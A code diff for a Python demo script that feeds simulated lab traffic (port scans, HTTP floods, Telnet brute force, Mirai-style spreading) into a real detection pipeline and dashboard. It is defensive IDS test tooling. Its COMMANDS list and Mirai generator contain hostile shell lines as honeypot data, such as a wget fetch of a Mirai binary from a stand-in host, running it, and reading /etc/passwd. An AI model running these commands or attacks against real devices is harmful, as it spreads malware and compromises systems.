@@ -8,15 +8,16 @@
 SIMULATION, said plainly: the network TRAFFIC is generated (the PoC lab: the ESP32-S3 honeypot, a phone, the
 laptop, and attackers). Everything after that is the real system, exactly as for a real recording:
 
-  every minute, for the minute that just passed:
-    1. real packets (scapy) of the lab's normal traffic, sometimes with an attack mixed in, chosen at random:
-       port scan, HTTP flood, Telnet brute force, or a Mirai-style bot spreading over Telnet
-       (different attackers, sizes and times, so the numbers keep changing)
+  every 15 seconds, for the 15 seconds that just passed (rhythm --pattern AAN: attack, attack, normal, ...):
+    1. real packets (scapy) of the lab's normal traffic, plus in an "A" slice one attack: port scan, HTTP flood,
+       Telnet brute force (sometimes it gets in and types commands) or a Mirai-style bot spreading over Telnet;
+       every type in turn, attackers taking turns, random sizes, so the numbers keep changing
     2. pcap -> Zeek (Docker) -> flows                       (the pipeline, Step 3)
     3. the honeypot's events (page visits, failed logins)   -> POST /api/v1/ingest/events
     4. the attack goes into Task A's attack log            -> POST /api/v1/attack-runs, then labels
     5. the rule baseline on the last 15 minutes            -> alerts (model 'rules', Step 7)
-    6. LSTM-AE + VAE + temporal GAT on that minute's pcap -> alerts (calibrated on pcaps/poc-normal.pcap)
+    6. every whole minute (4 slices), in the background: LSTM-AE + VAE + temporal GAT on that minute's pcap
+       -> alerts (calibrated on pcaps/poc-normal.pcap, which is one-minute windows of the same lab)
   every 2 s: an ESP32 sensor reading                        -> POST /api/v1/ingest/sensor
 
 On start it fills the gap of the last 24 hours (newest first, in the background), so every time range has data
@@ -28,6 +29,7 @@ from __future__ import annotations
 import argparse
 import logging
 import os
+import queue
 import random
 import shutil
 import sys
@@ -53,9 +55,15 @@ NORMAL_PCAP = BACKEND / "pcaps" / "poc-normal.pcap"        # what the AI models 
 CAPTURE = "cap-live-demo"
 ESP_DEVICE = "esp32s3-01"
 LAPTOP, ESP, PHONE = "192.168.137.1", "192.168.137.57", "192.168.137.20"
-ATTACKERS = ["192.168.137.50", "192.168.137.66", "192.168.137.77", "192.168.137.91"]
-BOTS = ["192.168.137.88", "192.168.137.112"]               # "smart plugs" that turn into Mirai bots
-CHUNK = 60                                                 # seconds of traffic per round
+ATTACKERS = ["192.168.137.50", "192.168.137.66", "192.168.137.77", "192.168.137.91", "192.168.137.103",
+             "192.168.137.145"]
+BOTS = ["192.168.137.88", "192.168.137.112", "192.168.137.130"]   # "smart plugs" that turn into Mirai bots
+CHUNK = 15                                                 # seconds of traffic per live round
+AI_EVERY = 4                                               # AI models on every 4 rounds = one full minute, the
+                                                           # length of the calibration windows they were tuned on
+PATTERN = "AAN"                                            # live rhythm: Attack, Attack, Normal, repeating
+COMMANDS = ["cat /proc/cpuinfo", "uname -a", "cd /tmp; wget http://198.51.100.23/bins/mirai.arm7",
+            "chmod 777 mirai.arm7; ./mirai.arm7", "busybox MIRAI", "cat /etc/passwd", "ps; netstat -an"]
 KEEP = timedelta(hours=25)
 PAGE = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 180\r\n\r\n<html>" + b"x" * 168 + b"</html>"
 CREDS = [("root", "admin"), ("admin", "admin"), ("root", "12345"), ("user", "user"), ("root", "vizxv"),
@@ -163,56 +171,96 @@ def normal_traffic(rng: random.Random, t0: float, t1: float) -> tuple[list, list
     return packets, events
 
 
+FLOOD_REQ = b"GET / HTTP/1.1\r\nHost: 192.168.137.57\r\n\r\n"
+LOGIN_FAIL = b"\r\nLogin incorrect\r\nlogin: "
+
+
+def login_req(user: str, pw: str) -> bytes:
+    return f"{user}\r\n{pw}\r\n".encode()
+
+
+def device_log(t: float, msg: str, severity: str = "low", **extra) -> dict:
+    """What the ESP32 honeypot writes in its own log about an attack (layer: device & service logs)."""
+    return {"ts": iso(t), "source": "esp32", "event_type": "device_log", "device_id": ESP_DEVICE, "capture_id": CAPTURE,
+            "src_ip": ESP, "severity": severity, "payload": {"msg": msg, **extra}}
+
+
 def port_scan(rng, src, t0):
-    packets, t, n = [], t0, rng.randint(250, 1000)
+    """SYN scan of the ESP32 (closed ports answer with a reset). Fits in one 15-second slice."""
+    packets, t, n = [], t0, rng.randint(250, 600)
     for port in rng.sample(range(1, 1025), n):
         sport = rng.randint(40000, 60000)
         packets.append(pkt(src, ESP, TCP(sport=sport, dport=port, flags="S", seq=1), t))
         packets.append(pkt(ESP, src, TCP(sport=port, dport=sport, flags="RA", seq=0, ack=2), t + 0.002))
-        t += rng.uniform(0.002, 0.02)
-    return packets, [honeypot_event(t0, "session_open", src, 80, service="http")], t, f"SYN scan of {n} ports"
+        t += rng.uniform(0.002, 0.012)
+    events = [honeypot_event(t0 + 0.1, "session_open", src, 23, service="telnet"),
+              honeypot_event(t0 + 0.2, "session_open", src, 80, service="http"),
+              device_log(t, f"many connection attempts from {src}: {n} ports in {t - t0:.0f} s", "medium", ports=n)]
+    return packets, events, t, f"SYN scan of {n} ports"
 
 
 def http_flood(rng, src, t0):
-    packets, events, n, span = [], [], rng.randint(200, 600), rng.uniform(15, 30)
+    """Hundreds of HTTP requests to the ESP32's web page in ~10 s."""
+    packets, events, n, span = [], [], rng.randint(200, 500), rng.uniform(8, 11)
     for i in range(n):
         t = t0 + i * span / n
-        packets += tcp_conn(src, rng.randint(40000, 60000), ESP, 80, t, b"GET / HTTP/1.1\r\nHost: 192.168.137.57\r\n\r\n",
-                            PAGE, rng.uniform(0.2, 1.5))
-        if i % 10 == 0:                                    # the honeypot logs a sample of the requests
-            events.append(honeypot_event(t, "http_request", src, 80, method="GET", path="/", service="http"))
-    return packets, events, t0 + span + 1.5, f"{n} HTTP connections in {span:.0f} s"
+        packets += tcp_conn(src, rng.randint(40000, 60000), ESP, 80, t, FLOOD_REQ, PAGE, rng.uniform(0.2, 1.0))
+        if i % 12 == 0:                                    # the honeypot logs a sample of the requests
+            events.append(honeypot_event(t, "http_request", src, 80, method="GET",
+                                         path=rng.choice(["/", "/", "/status", "/login"]), service="http"))
+    events.append(device_log(t0 + span, f"HTTP overload: {n} requests from {src} in {span:.0f} s", "high", requests=n))
+    return packets, events, t0 + span + 1.0, f"{n} HTTP connections in {span:.0f} s"
 
 
 def telnet_brute(rng, src, t0):
-    packets, events, t, n = [], [], t0, rng.randint(12, 30)        # at most ~40 s, so it fits in its minute
+    """Default-password guessing on the fake Telnet; sometimes it gets in and types commands."""
+    packets, events, t, n = [], [], t0, rng.randint(8, 12)
     for _ in range(n):
         user, pw = rng.choice(CREDS)
-        packets += tcp_conn(src, rng.randint(40000, 60000), ESP, 23, t, f"{user}\r\n{pw}\r\n".encode(),
-                            b"\r\nLogin incorrect\r\nlogin: ", rng.uniform(0.3, 0.9))
+        packets += tcp_conn(src, rng.randint(40000, 60000), ESP, 23, t, login_req(user, pw), LOGIN_FAIL,
+                            rng.uniform(0.2, 0.5))
         events.append(honeypot_event(t, "login_failed", src, 23, service="telnet", username=user, password=pw))
-        t += rng.uniform(0.6, 1.3)
-    return packets, events, t, f"{n} Telnet logins with default passwords"
+        t += rng.uniform(0.5, 0.8)
+    what = f"{n} Telnet logins with default passwords"
+    if rng.random() < 0.5:                                 # the honeypot lets it in, to watch what it does
+        user, pw = rng.choice(CREDS)
+        session = f"{rng.getrandbits(32):08x}"
+        events.append(honeypot_event(t, "login_success", src, 23, service="telnet", username=user, password=pw,
+                                     session=session))
+        for cmd in rng.sample(COMMANDS, 2):
+            t += rng.uniform(0.4, 0.9)
+            events.append(honeypot_event(t, "command", src, 23, service="telnet", input=cmd, session=session))
+        what += ", then logged in and ran commands"
+    events.append(device_log(t, f"telnet: {n} failed logins from {src}", "medium", failed=n))
+    return packets, events, t, what
 
 
 def mirai(rng, bot, t0):
-    """A bot sweeping the subnet on Telnet (most addresses don't exist: no answer), then trying default logins."""
+    """A bot sweeping the subnet on Telnet (most addresses don't exist: no answer), then default logins and the
+    Mirai loader's commands."""
     packets, events, t = [], [], t0
     targets = rng.sample([f"192.168.137.{i}" for i in range(2, 255) if f"192.168.137.{i}" not in (bot, ESP)],
-                         rng.randint(30, 70))
+                         rng.randint(30, 50))
     for dst in targets + [ESP]:
         sport = rng.randint(40000, 60000)
         packets.append(pkt(bot, dst, TCP(sport=sport, dport=rng.choice([23, 23, 2323]), flags="S", seq=1), t))
         if dst in (LAPTOP, PHONE):
             packets.append(pkt(dst, bot, TCP(sport=23, dport=sport, flags="RA", seq=0, ack=2), t + 0.003))
-        t += rng.uniform(0.05, 0.3)
-    for _ in range(rng.randint(3, 8)):
+        t += rng.uniform(0.04, 0.1)
+    session = f"{rng.getrandbits(32):08x}"
+    for _ in range(rng.randint(3, 5)):
         user, pw = rng.choice(CREDS)
-        packets += tcp_conn(bot, rng.randint(40000, 60000), ESP, 23, t, f"{user}\r\n{pw}\r\n".encode(),
-                            b"\r\nLogin incorrect\r\nlogin: ", rng.uniform(0.3, 0.8))
+        packets += tcp_conn(bot, rng.randint(40000, 60000), ESP, 23, t, login_req(user, pw), LOGIN_FAIL,
+                            rng.uniform(0.2, 0.5))
         events.append(honeypot_event(t, "login_failed", bot, 23, service="telnet", username=user, password=pw))
-        t += rng.uniform(0.8, 2.0)
-    return packets, events, t, f"Telnet sweep of {len(targets)} addresses + default logins"
+        t += rng.uniform(0.5, 0.9)
+    events.append(honeypot_event(t, "login_success", bot, 23, service="telnet", username="root", password="xc3511",
+                                 session=session))
+    for cmd in ("busybox MIRAI", "cd /tmp; wget http://198.51.100.23/bins/mirai.arm7"):
+        t += rng.uniform(0.3, 0.7)
+        events.append(honeypot_event(t, "command", bot, 23, service="telnet", input=cmd, session=session))
+    events.append(device_log(t, f"telnet sweep from {bot}: {len(targets)} addresses, Mirai loader commands", "high"))
+    return packets, events, t, f"Telnet sweep of {len(targets)} addresses + default logins + loader"
 
 
 GENERATORS = {"port_scan": port_scan, "http_flood": http_flood, "telnet_brute": telnet_brute, "mirai": mirai}
@@ -238,8 +286,11 @@ class Lab:
         return r.json()
 
     def slice(self, t0: float, t1: float, attacks: list[tuple[float, str, str]], rng: random.Random,
-              tag: str = "live") -> None:
-        """Traffic of [t0, t1) with these (time, kind, attacker) attacks, through the whole system."""
+              tag: str = "live", models: bool | None = None) -> list:
+        """Traffic of [t0, t1) with these (time, kind, attacker) attacks, through the whole system.
+        models=False leaves out the AI models (live mode runs them on whole minutes, see ai_worker).
+        Returns the slice's packets."""
+        models = self.ai if models is None else models
         from correlate.store import run_period
         from ingest.flows import load_conn_log
         from ingest.zeek import run_zeek
@@ -274,9 +325,31 @@ class Lab:
                 start = datetime.fromtimestamp(t0, timezone.utc)                              # 5. rule baseline
                 n = run_period(conn, CAPTURE, start - timedelta(minutes=14), datetime.fromtimestamp(t1, timezone.utc))
                 self.stats["rule_incidents"] = n
-            if self.ai and NORMAL_PCAP.exists():                                               # 6. AI models
+            if models and NORMAL_PCAP.exists():                                                # 6. AI models
                 self.stats["ai_alerts"] += run_ai(pcap, tag)
             self.stats["rounds"] += 1
+        finally:
+            shutil.rmtree(work, ignore_errors=True)
+        return packets
+
+
+def ai_worker(jobs: "queue.Queue", lab: Lab, stop: threading.Event) -> None:
+    """Live mode: LSTM-AE + VAE + GAT on each whole minute (four 15-second slices), in the background, so the
+    15-second rhythm never waits for the models. A minute is the length the models were calibrated on."""
+    while not stop.is_set():
+        try:
+            packets, tag = jobs.get(timeout=1)
+        except queue.Empty:
+            continue
+        work = Path(tempfile.mkdtemp(prefix="aegex-ai-"))
+        try:
+            pcap = work / f"minute-{tag}.pcap"
+            with PcapWriter(str(pcap), linktype=1, sync=False) as w:
+                for p in sorted(packets, key=lambda p: p.time):
+                    w.write(p)
+            n = run_ai(pcap, f"minute-{tag}")
+            lab.stats["ai_alerts"] += n
+            say(f"AI models on the last minute: {n} alert(s)")
         finally:
             shutil.rmtree(work, ignore_errors=True)
 
@@ -414,7 +487,9 @@ def clean(db_url: str) -> None:
 def main(argv=None) -> int:
     ap = argparse.ArgumentParser(description="The live demo lab: simulated traffic through the real system.")
     ap.add_argument("--api", default="http://127.0.0.1:8001")
-    ap.add_argument("--attack-every", type=float, default=150, help="average seconds between live attacks")
+    ap.add_argument("--pattern", default=PATTERN,
+                    help="live rhythm of 15-second slices: A = attack, N = normal only (default %(default)s: "
+                         "two attacks, then one normal slice, repeating)")
     ap.add_argument("--no-backfill", action="store_true", help="don't fill the last 24 hours")
     ap.add_argument("--no-ai", action="store_true", help="skip the AI models (faster; rules still run)")
     ap.add_argument("--clean", action="store_true", help="delete everything the demo made")
@@ -454,29 +529,49 @@ def main(argv=None) -> int:
             f"{datetime.fromtimestamp(x):%d %b %H:%M}-{datetime.fromtimestamp(y):%H:%M}" for x, y in gaps))
     say(f"live demo running on {db} (capture {CAPTURE}); open the dashboard. Ctrl+C to stop.")
     rng = random.Random()
-    next_attack = time.time() + rng.uniform(20, 60)
+    pattern = "".join(c for c in a.pattern.upper() if c in "AN") or PATTERN
+    kinds: list[str] = []                                  # every attack type once (random order), then again
+    attackers, bots = list(ATTACKERS), list(BOTS)          # attackers take turns, so incidents stay apart
+    jobs: queue.Queue = queue.Queue(maxsize=2)
+    if not a.no_ai and NORMAL_PCAP.exists():
+        threading.Thread(target=ai_worker, args=(jobs, lab, stop), daemon=True).start()
+    minute, turn = [], 0
     t0 = now - CHUNK
+    say(f"rhythm: every {CHUNK} s a slice of traffic, pattern {pattern} (A = attack, N = normal only); "
+        f"AI models on every whole minute")
     try:
         while True:
             t1 = t0 + CHUNK
-            wait = t1 + 2 - time.time()                    # the slice is processed once its minute is over
+            wait = t1 + 2 - time.time()                    # a slice is processed once its 15 seconds are over
             if wait > 0:
                 time.sleep(wait)
             attacks = []
-            while next_attack < t1:
-                kind, src = pick_attack(rng)
-                at = min(max(next_attack, t0 + 1), t1 - 42)          # every attack ends inside its minute
-                attacks.append((at, kind, src))
-                next_attack = at + rng.uniform(0.6, 1.4) * a.attack_every
+            if pattern[turn % len(pattern)] == "A":
+                if not kinds:
+                    kinds = list(ATTACKS)
+                    rng.shuffle(kinds)
+                kind = kinds.pop()
+                who = bots if kind == "mirai" else attackers
+                src = who.pop(0)
+                who.append(src)
+                attacks.append((t0 + rng.uniform(0.3, 2.0), kind, src))
+            turn += 1
             try:
-                lab.slice(t0, t1, attacks, rng, tag=f"{int(t0)}")
+                minute += lab.slice(t0, t1, attacks, rng, tag=f"{int(t0)}", models=False)
                 s = lab.stats
-                say(f"minute {datetime.fromtimestamp(t0):%H:%M}: " + (", ".join(f"{k} from {src}" for _, k, src in attacks)
+                say(f"{datetime.fromtimestamp(t0):%H:%M:%S} " + (", ".join(f"ATTACK {k} from {src}" for _, k, src in attacks)
                     or "normal traffic") + f" | totals: {s['flows']:,} flows, {s['events']:,} events, "
                     f"{s['attacks']} attacks, {s['ai_alerts']} AI alerts")
             except Exception as exc:
                 say(f"round failed (it goes on): {type(exc).__name__}: {exc}")
                 traceback.print_exc(limit=2)
+            if turn % AI_EVERY == 0:
+                if not a.no_ai and minute:
+                    try:
+                        jobs.put_nowait((minute, f"{int(t0)}"))
+                    except queue.Full:
+                        say("AI models still busy with earlier minutes: this minute is skipped by them")
+                minute = []
             t0 = t1
     except KeyboardInterrupt:
         stop.set()
